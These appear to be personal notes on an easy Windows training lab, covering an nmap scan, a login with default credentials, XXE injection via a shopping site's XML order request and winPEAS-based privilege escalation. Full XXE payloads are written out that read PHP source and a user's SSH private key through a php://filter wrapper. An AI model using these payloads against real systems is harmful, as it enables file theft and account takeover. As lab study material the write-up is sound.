## Lab Details
- Difficulty: Easy
- OS: Windows

## Summary
- Initial access: Weak credentials, XXE Injection
- Privilege escalation: Stored plain text credentials 

## Enumeration
#### Steps
- run `nmap`
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_http-title: MegaShopping
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
```
## Foothold

#### Steps
- Visit port 80 we are presented with a login page
- Attempted to login with common credentials and found below works
```
admin : password
```
- There is a bulk order option on the `service.php` page
- Make and request and capture using `burpsuite`
- Found that its making a XML call 
![[Pasted image 20260602155207.png]]
- We can attempt to perform LFI via XXE Injection by creating an external identify and reference it 
- Using `php wrapper` to encode the file in base64 incase of any special characters 
![[Pasted image 20260602155313.png]]
- Below is the payload to get the base64 encode of `index.php`
```xml
<?xml version = "1.0"?>
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php"> 
]>
<order>
	<quantity>123</quantity>
	<item>&company;</item>
	<address>123</address>
</order>
```
- Convert back to plain text 
```
$ echo "response" | base64 -d
<?php
include("db.php");
session_start();
if (isset($_POST["username"]) && isset($_POST["password"])) {
    $stmt = $conn->prepare("select username,password from users where username=? and password=?");
    $stmt->bind_param("ss", $_POST["username"], $_POST["password"]);
    $stmt->execute();
    $stmt->store_result();
    
<SNIP>
```
- Enumerate the web app further we found a username in `service.php`
![[Pasted image 20260602154650.png]]
- We can use that information to fetch the private key of the user, payload below
```
<?xml version = "1.0"?>
<!DOCTYPE email [ 
	<!ENTITY company SYSTEM 	 "php://filter/convert.base64-encode/resource=C://Users/Daniel/.ssh/id_rsa"> 
]>
<order>
	<quantity>this</quantity>
	<item>&company;</item>
	<address>123</address>
</order>
```
- Convert back to plain text and connect to target via `ssh` using the private key

## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Load and run `winpeas.exe`
- Found `Autologon` credentials 
```
+----------¦ Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultUserName               :  Administrator
    DefaultPassword               :  Yhk}QE&j<3M
```
- `ssh` to target as admin
```
$ ssh Administrator@10.129.8.109
Administrator@10.129.8.109's password: 

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

administrator@MARKUP C:\Users\Administrator>
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: